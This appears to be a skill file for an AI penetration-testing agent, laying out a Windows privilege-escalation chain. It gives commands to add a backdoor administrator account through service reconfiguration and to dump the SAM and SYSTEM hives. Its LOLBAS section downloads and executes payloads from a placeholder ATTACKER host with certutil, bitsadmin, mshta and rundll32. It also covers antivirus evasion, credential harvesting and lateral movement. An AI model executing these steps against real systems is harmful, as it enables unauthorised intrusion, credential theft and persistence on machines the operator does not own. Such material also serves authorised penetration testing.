# skill: privesc_windows
title: Windows Privilege Escalation (LOLBAS × PEASS distillation)
when: windows,cmd,powershell,administrator,win,privesc,escalate,service,token

## OPERATING PRINCIPLE
Windows privesc is a checklist you walk, not a mystery: unquoted service
paths, modifiable services, AlwaysInstallElevated, stored credentials,
token privileges. Every check is one command away.

## CHAIN (cmd_exec_probe os_flavor=win → shell_exec)
1. Context: `whoami /all`, `whoami /priv`, `net user`, `systeminfo`.
2. Token privileges — the instant wins:
   SeImpersonatePrivilege → Juicy Potato / PrintSpoofer class (SPoA by
   service). SeBackupPrivilege → read SAM/SYSTEM, copy protected files.
   SeAssignPrimaryToken, SeLoadDriver, SeTakeOwnership → known escalations.
3. Services: `wmic service get name,pathname,startmode,startname | findstr /i auto`
   — UNQUOTED binary paths with a space = plant your exe in the parent dir.
4. Modifiable services: `accesschk /uws <user> *` concept — svcconfig writable
   → `sc config <svc> binpath= "cmd /c net user hax Hax!123 /add"`.
5. AlwaysInstallElevated:
   `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
   (and HKCU) — both 1 → craft MSI, install, SYSTEM.
6. Stored creds: `cmdkey /list`, registry autoruns, `unattend.xml` in
   C:\Windows\System32\sysprep\, Group Policy preferences (cpassword).
7. Scheduled tasks running as SYSTEM with writable binaries — swap the binary.
8. Hot patch surface: systeminfo hotfix list missing famous KBs →
   nvd_search + nday_exploit (MS16-032 class, PrintNightmare class).

## TECHNIQUE MATRIX (LOLBAS style — native binaries, no upload needed)
- certutil -urlcache -f http://ATTACKER/x.exe C:\x.exe   (fetch)
- bitsadmin /transfer job http://ATTACKER/x.exe C:\x.exe (fetch)
- mshta http://ATTACKER/x.hta                            (execute)
- rundll32 \\ATTACKER\share,x.dll,StartW                 (execute)
- installutil /logfile= /LogToConsole=false /u x.exe     (execute)
- reg save HKLM\SAM sam.bak && reg save HKLM\SYSTEM sys.bak (dump; SeBackup)

## PIVOTS
- SAM/lsass dump → hash crack → lateral with port_scan_sync + 445/3389 reach.
- DPAPI blobs, saved RDP creds, browser vaults — credential reuse is the map.
- Domain user reached? Switch to ad_hunter skill (skill_load ad_hunter).

## FAILURE MODES
- accesschk missing: `sc qc <svc>` + icacls on the binary path replace it.
- AV blocks mshta: prefer certutil+regsvr32 or LOLBAS signed binaries.
- UAC middle tier: look for auto-elevate binaries (fodhelper class).
